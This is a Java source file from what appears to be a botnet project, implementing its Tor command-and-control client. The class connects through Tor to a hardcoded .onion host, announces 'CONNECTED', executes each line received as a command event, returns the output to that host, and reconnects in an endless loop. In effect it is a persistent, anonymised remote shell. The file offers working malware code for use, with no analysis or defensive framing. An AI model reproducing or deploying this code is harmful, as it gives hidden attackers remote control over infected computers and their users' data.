package com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.tor.handler;

import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.events.control.ControlEvent;
import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.events.command.CommandEvent;
import com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.header.CommonHeader;
import com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.tor.header.TorHeader;
import com.google.common.eventbus.Subscribe;
import com.subgraph.orchid.TorInitializationListener;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketTimeoutException;
import lombok.Getter;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class TorHandler implements TorInitializationListener {

    Logger logger = LoggerFactory.getLogger(getClass());

    private PrintWriter writer;
    private BufferedReader reader;

    public void register() {
        CommonHeader.getEVENT_HEADER().getTorEventBus().register(this);
    }

    @Getter
    TorProcess torProcess = new TorProcess();

    //FIXME
    @Subscribe
    void controlEventPoint(ControlEvent event) {
        ControlEvent controlEvent = (ControlEvent) event;
        ControlEvent.CONTROL_TYPE type = controlEvent.getType();
        switch (type) {
            case INIT:
                CommonHeader.getTOR_HEADER().getTOR_HANDLER().getTorProcess().init();
                break;
            case START:
                try {
                CommonHeader.getTOR_HEADER().getTOR_HANDLER().getTorProcess().start();
            } catch (Exception e) {
                logger.error("", e);
            }
            break;
            default:
                break;
        }
    }

    @Override
    public void initializationProgress(String string, int i) {
        logger.info("[" + i + "]" + string);
    }

    @Override
    public void initializationCompleted() {
        CommonHeader.getTOR_HEADER().init();
        CommonHeader.getTOR_HEADER().start();
        do {
            try {
                Socket socket = TorHeader.getTorClient().getSocketFactory().createSocket("pbc6urv4bakvxkjs.onion", 8000);

                this.writer = new PrintWriter(socket.getOutputStream(), true);
                this.reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                writer.println("CONNECTED");
                String line;
                while ((line = reader.readLine()) != null) {
                    CommandEvent commandEvent = new CommandEvent();
                    commandEvent.setCommand(line);
                    CommonHeader.getEVENT_HEADER().getCommandEventBus().post(commandEvent);
                }
                socket.close();
            } catch (java.net.ConnectException | SocketTimeoutException e) {
                logger.error(null, e);
            } catch (Exception ex) {
                logger.error(null, ex);
            }
            if (CommonHeader.debug) {
                logger.info("reconnect");
            }
        } while (true);
    }

    @Subscribe
    void sendOutPutFromCommand(CommandEvent event) {
        try {
            String output = event.getOutput();
            writer.println(output);
            writer.flush();
        } catch (NullPointerException npe) {
            npe.getClass();//IGNORE
        } catch (Exception e) {
            logger.error("", e);
        }
    }
}
